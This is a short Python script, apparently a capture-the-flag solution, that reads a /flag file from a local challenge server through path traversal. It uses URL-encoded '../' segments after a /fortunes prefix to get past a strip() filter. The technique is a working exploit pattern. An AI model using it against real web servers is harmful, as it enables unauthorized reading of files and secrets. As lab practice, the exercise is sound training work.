from requests import request

# Bypass the strip() function by adding a prefix (the existing /fortunes folder) and a suffix (the /flag file).

method = "GET"
site = "http://challenge.localhost/fortunes/%2E%2E/%2E%2E/%2E%2E/flag"
port = 80

url = f"{site}"

response = request(method, url)

print(f"\nResponse: {response.text}")
